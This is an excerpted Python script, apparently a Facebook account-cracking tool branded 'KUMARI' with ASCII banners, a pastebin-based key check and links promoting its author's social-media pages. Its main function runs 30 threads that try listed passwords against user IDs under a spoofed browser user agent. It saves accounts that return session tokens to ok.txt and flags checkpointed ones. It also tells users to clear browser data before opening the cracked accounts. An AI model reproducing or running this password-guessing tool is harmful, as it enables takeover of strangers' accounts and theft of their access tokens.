...
def logo():
 ...
 _  _  __  __  __  __    __    ____  ____ 
( )/ )(  )(  )(  \/  )  /__\  (  _ \(_  _)
 )  (  )(__)(  )    (  /(__)\  )   / _)(_ 
(_)\_)(______)(_/\/\_)(__)(__)(_)\_)(____)

 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m KUMARI TRICKER\x1b[0m\x1b[1;97m]
...
def logo2():
 ...
 __                              .__ 
|  | ____ __  _____ _____ _______|__|
|  |/ /  |  \/     \\__  \\_  __ \  |
|    <|  |  /  Y Y  \/ __ \|  | \/  |
|__|_ \____/|__|_|  (____  /__|  |__|
     \/           \/     \/          
                                                                          
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m KUMARI\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ************************************]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Nisha002\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./KUMARI.HUN.YAWRQ \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastebin.com/raw/vz7XvHbV"])
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/KUMARI.HUN.YAWR")
	runtxt("\033[0;97m Key Approval k liye follow must he >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key aprvl k liye 1st follow kren")
	os.system("xdg-open https://fb.watch/dZY5UKxNZ-/")
	subprocess.check_output(["am", "start", "https://www.facebook.com/KUMARI.HUN.YAWR"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://pastebin.com/raw/vz7XvHbV').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : **********\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Nisha002 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/KUMARI.HUN.YAWR \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UC-okzD-ryuhOow-OLmYdeMw"])
		print("───────────────────────────────────────────────────────× ")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				logo2()
				print("───────────────────────────────────────────────────────× ")
				print("\033[0;92m[=×>]\033[0;92m NOTE : CLEAR UR FB/BROWSER DATA ")
				print("\033[0;92m[=×>]\033[0;92m NOTE : BEFORE OPEN CP IDZ " )
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=KUMARI=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=KUMARI=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=KUMARI=CP=>] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/KUMARI.HUN.YAWR ")
		print(" [*] Instagram : https://instagram.com/********* ")
		print(" [*] YouTube   : https://youtube.com/channel/UC-okzD-ryuhOow-OLmYdeMw ")
		exit(" [*] GitHub    : https://github.com/Nisha002 ")
	else:
		Main()
